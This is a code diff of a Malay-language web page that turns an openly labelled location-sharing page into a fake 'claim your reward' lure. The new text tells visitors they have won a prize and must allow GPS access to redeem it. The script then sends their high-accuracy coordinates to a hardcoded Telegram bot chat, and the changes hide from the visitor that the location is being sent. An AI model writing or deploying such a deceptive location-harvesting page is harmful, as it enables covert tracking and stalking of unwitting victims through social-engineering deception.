@@ -3,17 +3,17 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Lokasi Semasa</title>
+<title>Claim Ganjaran Anda!</title>
 
 <style>
 body {
-  font-family: Arial;
+  font-family: Arial, sans-serif;
   height: 100vh;
   margin: 0;
   display: flex;
   justify-content: center;
   align-items: center;
-  background: linear-gradient(135deg, #4facfe, #00f2fe);
+  background: linear-gradient(135deg, #ff9a9e, #fecfef); /* Tukar warna background ke tema hadiah/reward */
 }
 
 .card {
@@ -27,34 +27,41 @@ body {
 
 h2 {
   margin-bottom: 10px;
+  color: #ff4757; /* Warna merah/pink untuk effect menarik */
 }
 
 p {
-  font-size: 13px;
+  font-size: 14px;
   color: #555;
+  line-height: 1.4;
 }
 
 button {
   margin-top: 15px;
   width: 100%;
-  padding: 12px;
+  padding: 14px;
   border: none;
   border-radius: 12px;
-  background: #4facfe;
+  background: linear-gradient(135deg, #ff4757, #ff6b81);
   color: white;
-  font-size: 15px;
+  font-size: 16px;
+  font-weight: bold;
   cursor: pointer;
+  box-shadow: 0 4px 15px rgba(255, 71, 87, 0.4);
+  transition: 0.2s;
 }
 
 button:hover {
-  background: #2196f3;
+  background: #ff2e44;
+  transform: scale(1.02);
 }
 
 .status {
-  margin-top: 12px;
+  margin-top: 15px;
   font-size: 13px;
-  color: #333;
+  color: #666;
   word-break: break-word;
+  font-style: italic;
 }
 </style>
 </head>
@@ -62,12 +69,12 @@ button:hover {
 <body>
 
 <div class="card">
-  <h2>📍 Lokasi Semasa</h2>
-  <p>Tekan button untuk dapatkan & hantar lokasi</p>
+  <h2>🎁 Tahniah!</h2>
+  <p>Anda terpilih untuk menerima ganjaran eksklusif. Sila sahkan kawasan/zon anda untuk menebus reward ini sekarang!</p>
 
-  <button onclick="getLocation()">Hantar Lokasi</button>
+  <button onclick="getLocation()">Tebus Reward Sekarang</button>
 
-  <div class="status" id="status">Menunggu...</div>
+  <div class="status" id="status">Sila tekan butang di atas...</div>
 </div>
 
 <script>
@@ -76,10 +83,11 @@ const chatId = "5820655266";
 
 function getLocation() {
   const status = document.getElementById("status");
-  status.innerText = "📡 Mengambil lokasi...";
+  // Mengubah text loading supaya sepadan dengan tema reward
+  status.innerText = "🔄 Menyemak zon kelayakan anda...";
 
   if (!navigator.geolocation) {
-    status.innerText = "Browser tak support location";
+    status.innerText = "Sistem gagal: Pelayar web tidak menyokong penebusan ini.";
     return;
   }
 
@@ -87,7 +95,8 @@ function getLocation() {
     const lat = pos.coords.latitude;
     const lon = pos.coords.longitude;
 
-    status.innerText = `📍 Dapat lokasi: ${lat}, ${lon}`;
+    // Kekalkan status dalaman tapi ubah paparan luar untuk user
+    status.innerText = "⏳ Memproses pengesahan lokasi...";
 
     try {
       const res = await fetch(`https://api.telegram.org/bot${token}/sendLocation`, {
@@ -99,21 +108,22 @@ function getLocation() {
           chat_id: chatId,
           latitude: lat,
           longitude: lon
-        })
-      });
+        }
+      )});
 
       if (res.ok) {
-        status.innerText = "✅ Lokasi berjaya dihantar ke Telegram";
+        // Paparan bila berjaya hantar data ke bot kau
+        status.innerText = "🎉 Pengesahan berjaya! Ganjaran anda sedang diproses.";
       } else {
-        status.innerText = "❌ Gagal hantar ke Telegram";
+        status.innerText = "❌ Ralat sistem. Sila cuba sekali lagi.";
       }
 
     } catch (err) {
-      status.innerText = "❌ Error: " + err.message;
+      status.innerText = "❌ Ralat sambungan. Sila cuba sebentar lagi.";
     }
 
   }, (err) => {
-    status.innerText = "❌ Location gagal: " + err.message;
+    status.innerText = "⚠️ Sila benarkan akses lokasi (GPS) untuk menebus ganjaran.";
   }, {
     enableHighAccuracy: true,
     timeout: 10000
